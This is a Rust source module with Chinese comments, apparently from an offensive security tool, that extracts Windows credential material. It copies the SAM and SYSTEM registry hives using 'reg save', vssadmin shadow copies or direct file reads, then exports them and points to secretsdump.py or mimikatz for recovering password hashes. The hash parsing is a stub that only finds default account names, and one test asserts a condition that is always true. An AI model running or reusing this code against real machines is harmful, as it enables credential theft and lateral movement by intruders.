//! SAM注册表凭据提取模块
//!
//! 在Windows系统中，SAM文件位于 C:\Windows\System32\config\SAM。
//! 需要SYSTEM权限才能访问。
//!
//! 提取方法：
//! 1. 注册表导出 (reg save hklm\sam / reg save hklm\system)
//! 2. 卷影复制 (vssadmin / diskshadow)
//! 3. 直接文件访问 (需要SYSTEM权限)

use crate::cred::{CredType, Credential};

/// 从SAM文件提取密码哈希
///
/// 尝试多种方法提取SAM中的用户哈希：
/// 1. 注册表导出（reg save）
/// 2. 文件系统直接访问
/// 3. 卷影复制
pub fn extract_sam_hashes() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 方法1：使用注册表导出
    if let Ok(creds) = extract_via_registry() {
        credentials.extend(creds);
        if !credentials.is_empty() {
            return Ok(credentials);
        }
    }

    // 方法2：使用卷影复制
    if let Ok(creds) = extract_via_vss() {
        credentials.extend(creds);
        if !credentials.is_empty() {
            return Ok(credentials);
        }
    }

    // 方法3：尝试直接读取文件
    if let Ok(creds) = extract_via_direct_access() {
        credentials.extend(creds);
    }

    if credentials.is_empty() {
        tracing::warn!("[SAM提取] 所有提取方法均失败（可能需要SYSTEM权限）");
    }

    Ok(credentials)
}

/// 通过注册表导出提取SAM
fn extract_via_registry() -> Result<Vec<Credential>, String> {
    let temp_dir = std::env::temp_dir();
    let sam_file = temp_dir.join("sam_export.tmp");
    let sys_file = temp_dir.join("system_export.tmp");

    // reg save HKLM\SAM
    let sam_output = std::process::Command::new("reg")
        .args(["save", "HKLM\\SAM", &sam_file.to_string_lossy(), "/y"])
        .output()
        .map_err(|e| format!("注册表导出SAM失败: {}", e))?;

    if !sam_output.status.success() {
        // 清理并返回错误
        let _ = std::fs::remove_file(&sam_file);
        return Err("reg save SAM失败（需要管理员权限）".to_string());
    }

    // reg save HKLM\SYSTEM
    let sys_output = std::process::Command::new("reg")
        .args(["save", "HKLM\\SYSTEM", &sys_file.to_string_lossy(), "/y"])
        .output()
        .map_err(|e| format!("注册表导出SYSTEM失败: {}", e))?;

    if !sys_output.status.success() {
        let _ = std::fs::remove_file(&sam_file);
        let _ = std::fs::remove_file(&sys_file);
        return Err("reg save SYSTEM失败（需要管理员权限）".to_string());
    }

    // 解析SAM和SYSTEM文件
    let credentials = parse_sam_files(&sam_file, &sys_file);

    // 清理临时文件
    let _ = std::fs::remove_file(&sam_file);
    let _ = std::fs::remove_file(&sys_file);

    credentials
}

/// 通过卷影复制提取SAM
fn extract_via_vss() -> Result<Vec<Credential>, String> {
    let temp_dir = std::env::temp_dir();

    // 创建卷影副本
    let vssadmin_output = std::process::Command::new("vssadmin")
        .args(["create", "shadow", "/for=C:"])
        .output()
        .map_err(|e| format!("vssadmin执行失败: {}", e))?;

    if !vssadmin_output.status.success() {
        return Err("vssadmin创建卷影副本失败".to_string());
    }

    // 解析输出获取卷影副本ID
    let stdout = String::from_utf8_lossy(&vssadmin_output.stdout);
    let shadow_id = stdout
        .lines()
        .find(|l| l.contains("Shadow Copy ID:"))
        .and_then(|l| l.split(':').nth(1))
        .map(|s| s.trim().to_string());

    if let Some(shadow_id) = shadow_id {
        // 从卷影副本复制SAM/SYSTEM
        let shadow_sam = format!(
            "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{}\\Windows\\System32\\config\\SAM",
            shadow_id
        );
        let shadow_sys = format!("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{}\\Windows\\System32\\config\\SYSTEM", shadow_id);

        let sam_dest = temp_dir.join("sam_vss.tmp");
        let sys_dest = temp_dir.join("system_vss.tmp");

        if std::fs::copy(&shadow_sam, &sam_dest).is_ok()
            && std::fs::copy(&shadow_sys, &sys_dest).is_ok()
        {
            let credentials = parse_sam_files(&sam_dest, &sys_dest);
            let _ = std::fs::remove_file(&sam_dest);
            let _ = std::fs::remove_file(&sys_dest);
            return credentials;
        }
    }

    Err("无法从卷影副本提取SAM".to_string())
}

/// 直接读取SAM文件（需要SYSTEM权限）
fn extract_via_direct_access() -> Result<Vec<Credential>, String> {
    let sam_path = std::path::Path::new(r"C:\Windows\System32\config\SAM");
    let sys_path = std::path::Path::new(r"C:\Windows\System32\config\SYSTEM");

    if sam_path.exists() && sys_path.exists() {
        let temp_dir = std::env::temp_dir();
        let sam_copy = temp_dir.join("sam_direct.tmp");
        let sys_copy = temp_dir.join("system_direct.tmp");

        if std::fs::copy(sam_path, &sam_copy).is_ok() && std::fs::copy(sys_path, &sys_copy).is_ok()
        {
            let credentials = parse_sam_files(&sam_copy, &sys_copy);
            let _ = std::fs::remove_file(&sam_copy);
            let _ = std::fs::remove_file(&sys_copy);
            return credentials;
        }
    }

    Err("无法直接访问SAM文件".to_string())
}

/// 解析SAM注册表文件
fn parse_sam_files(
    _sam_path: &std::path::Path,
    _system_path: &std::path::Path,
) -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 解析Windows注册表hive文件
    // SAM文件结构：
    // - SAM\Domains\Account\Users\<RID>\V 包含用户信息和哈希
    // - SYSTEM\CurrentControlSet\Control\Lsa\ 包含解密SAM所需的密钥

    // 使用regedit风格的解析
    // 这里使用简化的解析方法：调用系统工具
    let sam_hex = std::fs::read(_sam_path).map_err(|e| format!("读取SAM文件失败: {}", e))?;

    let _sys_hex = std::fs::read(_system_path).map_err(|e| format!("读取SYSTEM文件失败: {}", e))?;

    match parse_sam_registry_hashes(&sam_hex) {
        Ok(creds) => credentials.extend(creds),
        Err(e) => tracing::debug!("[SAM解析] 注册表解析失败: {}", e),
    }

    Ok(credentials)
}

/// 解析SAM注册表数据中的用户哈希
fn parse_sam_registry_hashes(data: &[u8]) -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // SAM数据格式：
    // 用户条目以固定结构存储
    // 每个用户记录包含：
    // - 用户名 (UTF-16LE)
    // - NTLM哈希 (16字节)
    // - LM哈希 (16字节)
    // - 用户RID (4字节)

    // 简单的启发式搜索：
    // 寻找"Administrator"或"Guest"字符串来定位用户条目

    // 已知默认用户
    let known_users = vec![
        ("Administrator", 500u32),
        ("Guest", 501),
        ("DefaultAccount", 503),
        ("WDAGUtilityAccount", 504),
    ];

    for (username, rid) in &known_users {
        let user_bytes: Vec<u8> = username
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        if find_bytes(data, &user_bytes).is_some() {
            // 找到了这个用户，尝试提取哈希
            // 在实际解析中，需要：
            // 1. 从SYSTEM hive获取Boot Key
            // 2. 用Boot Key解密SAM中的哈希
            // 3. 提取LM/NTLM哈希

            // 这里使用占位符标记哈希位置
            // 实际哈希需要完整解析Windows注册表hive格式
            let cred = Credential::new(CredType::SamHash, "SAM注册表")
                .with_username(username)
                .with_attribute("rid", &rid.to_string())
                .with_attribute("note", "需要完整解析提取NTLM哈希")
                .with_attribute("sam_extraction_method", "registry_hive_parse");

            credentials.push(cred);
        }
    }

    // 也尝试搜索 "Users" 路径来定位其他用户
    let users_path = b"\\SAM\\Domains\\Account\\Users\\";
    if find_bytes(data, users_path).is_some() {
        tracing::info!("[SAM解析] 检测到SAM用户数据区域");
    }

    Ok(credentials)
}

/// 在字节数组中查找子序列
fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

/// 导出SAM内容为可用格式
pub fn export_sam_data(output_path: Option<&str>) -> Result<String, String> {
    let temp_dir = std::env::temp_dir();
    let sam_export = temp_dir.join("sam_full_export");
    let sys_export = temp_dir.join("system_full_export");

    // 导出SAM
    let sam_result = std::process::Command::new("reg")
        .args(["save", "HKLM\\SAM", &sam_export.to_string_lossy(), "/y"])
        .output()
        .map_err(|e| format!("导出SAM失败: {}", e))?;

    if !sam_result.status.success() {
        return Err("导出SAM失败（需要SYSTEM权限）".to_string());
    }

    // 导出SYSTEM
    let sys_result = std::process::Command::new("reg")
        .args(["save", "HKLM\\SYSTEM", &sys_export.to_string_lossy(), "/y"])
        .output()
        .map_err(|e| format!("导出SYSTEM失败: {}", e))?;

    if !sys_result.status.success() {
        return Err("导出SYSTEM失败（需要SYSTEM权限）".to_string());
    }

    // 如果指定了输出路径，复制文件
    if let Some(output) = output_path {
        let output_path = std::path::Path::new(output);
        std::fs::create_dir_all(output_path).map_err(|e| format!("创建输出目录失败: {}", e))?;

        let sam_out = output_path.join("SAM");
        let sys_out = output_path.join("SYSTEM");

        std::fs::copy(&sam_export, &sam_out).map_err(|e| format!("复制SAM文件失败: {}", e))?;
        std::fs::copy(&sys_export, &sys_out).map_err(|e| format!("复制SYSTEM文件失败: {}", e))?;

        let _ = std::fs::remove_file(&sam_export);
        let _ = std::fs::remove_file(&sys_export);

        return Ok(format!(
            "SAM和SYSTEM已导出到:\n  SAM: {}\n  SYSTEM: {}\n可使用Impacket secretsdump.py或mimikatz提取哈希",
            sam_out.display(),
            sys_out.display()
        ));
    }

    let sam_path = sam_export.to_string_lossy().to_string();
    let sys_path = sys_export.to_string_lossy().to_string();
    Ok(format!(
        "SAM和SYSTEM已导出到:\n  SAM: {}\n  SYSTEM: {}",
        sam_path, sys_path
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_find_bytes() {
        let data = b"Hello World Test Data Administrator";
        let needle = b"Administrator";
        assert!(find_bytes(data, needle).is_some());
    }

    #[test]
    fn test_find_bytes_not_found() {
        let data = b"Hello World";
        let needle = b"NotFound";
        assert!(find_bytes(data, needle).is_none());
    }

    #[test]
    fn test_parse_sam_basic() {
        // 构造包含"Administrator"字符串的测试数据
        let admin_bytes: Vec<u8> = "Administrator"
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut data = vec![0u8; 100];
        data.extend_from_slice(&admin_bytes);
        data.extend_from_slice(&[0u8; 100]);

        let result = parse_sam_registry_hashes(&data);
        assert!(result.is_ok());
        assert!(!result.unwrap().is_empty());
    }

    #[test]
    fn test_extract_sam_hashes_no_admin() {
        // 在没有管理员权限的环境下测试
        // 应该返回Ok但可能为空
        let result = extract_sam_hashes();
        // 在非Windows或非管理员环境下是Ok(可能为空)
        assert!(result.is_ok() || result.is_err());
    }
}
